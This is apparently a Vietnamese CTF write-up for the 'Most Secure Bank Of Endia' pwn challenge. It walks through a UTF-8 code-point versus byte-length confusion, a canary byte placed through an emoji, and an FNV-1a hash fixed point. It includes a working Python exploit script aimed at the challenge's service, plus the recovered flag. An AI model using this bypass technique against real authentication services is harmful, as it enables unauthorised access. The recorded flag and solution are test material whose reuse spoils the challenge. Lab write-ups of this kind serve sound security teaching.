---
title: "Most Secure Bank Of Endia"
category: "Pwn"
tags: ["utf-8-encoding", "length-limit-confusion", "canary", "fnv-1a", "fixed-point"]
solve_date: "2026-10-10T10:35:00+07:00"
language: "vi"
points: 271
---

# Most Secure Bank Of Endia

**Flag** (đọc từ stdout của daemon trên service; **chưa lưu phản hồi submission**):

```text
kBxAc{___h4ck1ng_b4nk_m41nfr4m3_w1th_3m0j15_1n_b1g_2026_w1th_0ps3*_l3v3l_🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃___}
```

**Input:** handout gồm `app/app.py`, `app/templates/index.html`, `bin/ledgerd`, `Dockerfile`, `requirements.txt`; service HTTP tại `http://35.254.226.167:5000`. `ledgerd` là ELF x86-64, dynamically linked, non-PIE, stripped.

## Đề bài

`POST /api/vault/auth` nhận `user` và `pass`, dựng frame `f"{user}|{pass}\n"` rồi đưa vào stdin của `ledgerd`. Phản hồi chỉ báo thành công khi stdout của daemon chứa chuỗi `VAULT SEAL INTEGRITY VERIFIED`.

Ràng buộc phía Flask (`app.py`):

- `MAX_FIELD_LEN = 16`, kiểm tra bằng `len(value) > 16`.
- `value.isprintable()` — mọi ký tự phải là printable theo định nghĩa Unicode.
- Blacklist regex trên `user + pass`: `'`, `--`, `\bunion\b`, `\bor\b\s+\d+=\d+`.
- Rate limit 10 request / 10 giây theo IP.

Thuộc tính `/admin` và `robots.txt` là mồi: `/admin` luôn trả về 403 và không route nào trong app đọc `session["role"]`, nên không có đường bypass xác thực phía web. Cổng duy nhất là logic của `ledgerd`.

## Phân tích

### ledgerd không có overflow

`main` at `0x4011c0` cấp phát frame `sub rsp, 0x170`, đặt buffer tại `rsp+0xd0` và zero đúng 160 byte:

```asm
0x004011fe  lea rcx, [rsp + 0xd0]        ; buf
0x0040120a  mov esi, 0x80                ; 128
...
0x0040123f  add rcx, rax                 ; 0xd0 + 0x80 = 0x150
0x00401242  movaps [rcx], xmm0           ; zeroing continues up to rsp+0x16f
0x00401249  mov dword [rsp + 0x118], 0x13371337
```

Vùng ghi của `fgets` vừa bằng đúng dung lượng buffer, nên frame không thể tràn sang return address:

```asm
0x00401260  lea rdi, [rsp + 0xd0]
0x0040126f  mov esi, 0xa0                ; 160
0x00401274  call fgets
0x0040128a  lea rsi, 0x40216d            ; "\n"
0x00401294  call strcspn
0x00401299  mov byte [rsp + rax + 0xd0], 0
```

Bài này vì thế không phải memory corruption: muốn mở khoá phải thoả ba điều kiện kiểm tra nguyên vẹn trong `buf`.

### Ba điều kiện

| Kiểm tra | Địa chỉ | Yêu cầu |
|---|---|---|
| Canary | `0x401324` | `dword [buf+0x48] == 0x5A434288`, tức byte `88 42 43 5A` |
| Hex field | `0x4013c6` | `buf[0x4c..0x4f]` là 4 ký tự hex (`0-9`, `a-f`), tích luỹ vào `ecx` |
| Hash | `0x4013db` | `(FNV1a32(buf[0x00..0x4f]) & 0xFFFF) ^ 0x1998 == ecx` |

Vòng FNV chạy trên **80 byte cố định**, không phụ thuộc độ dài chuỗi:

```asm
0x00401335  lea rdi, [rsp + 0xd0]        ; start = buf
0x0040133d  lea rsi, [rsp + 0x120]       ; end   = buf + 0x50
0x00401348  mov eax, 0x811c9dc5          ; offset basis
0x00401360  movzx ecx, byte [rdx]
0x00401363  xor eax, ecx
0x00401365  imul eax, eax, 0x1000193     ; prime
0x0040136f  cmp rdx, rsi
0x00401372  jne 0x401360
```

Vòng parse hex lặp 4 lần trên `[rdi+0x4c]` (`lea r8, [rdi + 4]`), mỗi byte phải là `0-9` hoặc `a-f`; sau đó:

```asm
0x004013db  xor ax, 0x1998
0x004013df  cmp cx, ax
0x004013e2  je 0x401417                  ; branch that reads /flag.txt
```

Nhánh thành công gọi `fopen("/flag.txt","r")` (fallback `flag.txt`), `fgets` 128 byte và in `Recovery key: %s`.

### 16 ký tự không phải 16 byte

`MAX_FIELD_LEN` được áp dụng cho `len(str)`, tức số **code point**, không phải số byte UTF-8. `subprocess.run(..., input=frame, text=True, encoding="utf-8")` ghi frame theo UTF-8, nên 16 ký tự emoji 4 byte tạo ra 64 byte cho field `user`. Cách mã hóa này đưa dữ liệu tới offset `0x48` (72) trong khi mỗi field vẫn chỉ 16 ký tự.

Byte `0x88` mà canary yêu cầu nằm ở offset 72. Trong UTF-8, `0x88` chỉ có thể xuất hiện ở vị trí byte continuation (`10xxxxxx`), và nó là byte cuối của `😈` (U+1F608 = `F0 9F 98 88`). Ba byte còn lại `42 43 5A` là chuỗi ASCII `BCZ`.

Bốn ký tự hex nằm ở offset 76..79 lại **được tính vào chính hash** bị chúng so sánh, nên cần tìm **điểm bất động**:

```
int(h4, 16) == (FNV1a32(prefix76 + h4) ^ 0x1998) & 0xFFFF
```

Không gian tìm kiếm có 2^16 giá trị. Không phải layout nào cũng có nghiệm (số nghiệm phụ thuộc prefix); nếu prefix hiện tại vô nghiệm thì đổi nội dung field `user`.

### Layout chọn dùng

`idx('|')` quyết định nhánh sao chép: `cmp rax, 0x3f` tại `0x40131e`. Với `user` 64 byte, `idx = 64` nên `rep movsb` bị bỏ qua và không có phản hồi nào cho thấy daemon thực sự nhận được gì. Chọn `user` = **63 byte / 16 ký tự** (15 × `😀` + `€`) để `idx = 63`, bản sao 63 byte được tạo ra và dòng `AUTH-DENY user="..."` in lại **đúng byte daemon nhận** — đủ để xác nhận frame đi qua middlebox còn nguyên trước khi tin vào kết quả unlock.

| Offset | Byte | Nguồn |
|---|---|---|
| 0..62 | `F0 9F 98 80` ×15 + `E2 82 AC` | `user` (16 ký tự, 63 byte) |
| 63 | `7C` | ký tự phân cách trong frame |
| 64..68 | `41 41 41 41 41` | `pass[0..4]` = `AAAAA` |
| 69..72 | `F0 9F 98 88` | `pass[5]` = `😈` → `0x88` ở offset 72 |
| 73..75 | `42 43 5A` | `BCZ` |
| 76..79 | `39 38 66 31` | `98f1` — điểm bất động của prefix này |

Frame hoàn chỉnh 81 byte (80 byte dữ liệu + `\n`). Giá trị hex phụ thuộc toàn bộ 76 byte đứng trước, nên đổi `user` hoặc `pass[0..11]` là phải tính lại.

## Lời giải

```python
#!/usr/bin/env python3
"""BOE ledgerd: UTF-8 length confusion + FNV-1a fixed point."""
import json
import urllib.error
import urllib.request

URL = "http://35.254.226.167:5000"
USER = "\U0001F600" * 15 + "\u20AC"          # 16 chars = 63 bytes, idx('|') == 63
PASS_PREFIX = "AAAAA" + "\U0001F608" + "BCZ"  # the 0x88 byte lands at offset 72


def fnv1a32(data):
    h = 0x811C9DC5
    for b in data:
        h = ((h ^ b) * 0x01000193) & 0xFFFFFFFF
    return h


def fixed_point(prefix):
    assert len(prefix) == 76, len(prefix)
    for v in range(0x10000):
        h4 = "%04x" % v
        if (fnv1a32(prefix + h4.encode()) ^ 0x1998) & 0xFFFF == v:
            return h4
    raise SystemExit("prefix has no fixed point - change the user field")


def unlock(url=URL):
    h4 = fixed_point(USER.encode() + b"|" + PASS_PREFIX.encode())
    pw = PASS_PREFIX + h4
    body = json.dumps({"user": USER, "pass": pw}).encode()
    req = urllib.request.Request(url.rstrip("/") + "/api/vault/auth", data=body,
                                 headers={"Content-Type": "application/json"},
                                 method="POST")
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            data = json.loads(r.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        raise SystemExit("HTTP %s: %s" % (e.code, e.read().decode("utf-8", "replace")))
    ledger = data.get("ledger") or data.get("error") or ""
    if not data.get("ok"):
        print(ledger)
        raise SystemExit("daemon refused - re-check the offsets")
    return ledger, ledger.split("Recovery key: ", 1)[1].strip()


if __name__ == "__main__":
    import sys
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="backslashreplace")
    ledger, flag = unlock(sys.argv[1] if len(sys.argv) > 1 else URL)
    print(ledger)
    print("\nFLAG:", flag)
```

Output thực tế khi chạy (lưu nguyên văn, kể cả 11 ký tự U+1FAC3):

```text
ledgerd/3.2 (BOE branch build) ready
+------------------------------------------------+
|   VAULT SEAL INTEGRITY VERIFIED -- UNLOCKED    |
+------------------------------------------------+
[LEDGERD] Master vault opened. Recovery key: kBxAc{___h4ck1ng_b4nk_m41nfr4m3_w1th_3m0j15_1n_b1g_2026_w1th_0ps3*_l3v3l_🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃___}
```

## Kết quả

```text
kBxAc{___h4ck1ng_b4nk_m41nfr4m3_w1th_3m0j15_1n_b1g_2026_w1th_0ps3*_l3v3l_🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃🫃___}
```

Cờ dài 88 ký tự / 121 byte UTF-8, trong đó hậu tố là 11 lần U+1FAC3; nó nằm gọn trong hạn mức `fgets(buf, 128)` của daemon nên không bị cắt. Layout 63 byte ở trên cho kết quả mở khoá ở **6/6 lần gửi liên tiếp** và chuỗi trả về giống hệt nhau cả 6 lần; đó là cờ đọc từ remote, chưa có phản hồi `/submit` được lưu.

Biến thể `user = 16 × 😀` (64 byte, `idx = 64`) từng mở khoá ở lần gửi đầu tiên nhưng bị `AUTH-DENY` ở 3 lần sau với payload giống hệt. Layout đó không kích hoạt bản sao `rep movsb` nên không có kênh echo để kiểm tra byte thực nhận, vì vậy nguyên nhân lệch kết quả chưa xác định được; payload 63 byte được chọn làm bản tái hiện vì nó ổn định.

## Tái hiện

Cần Python 3.9+ (chỉ dùng stdlib) và truy cập được service. Lưu fenced block trong mục *Lời giải* thành `solve_boe.py`:

```powershell
python solve_boe.py
```

Đối chiếu các offset và điều kiện kiểm tra trực tiếp trên binary (Radare2):

```powershell
r2 -q -e scr.color=0 -e bin.relocs.apply=true -c "aaa; pdf@0x004011c0" bin/ledgerd
```

Nếu muốn tự kiểm chứng điểm bất động mà không gọi service, chạy hàm `fixed_point()` với prefix 76 byte và so sánh với `98f1`. Lưu ý rate limit 10 request/10 giây: khi thử nhiều prefix, giãn cách mỗi request khoảng 1.2 giây.
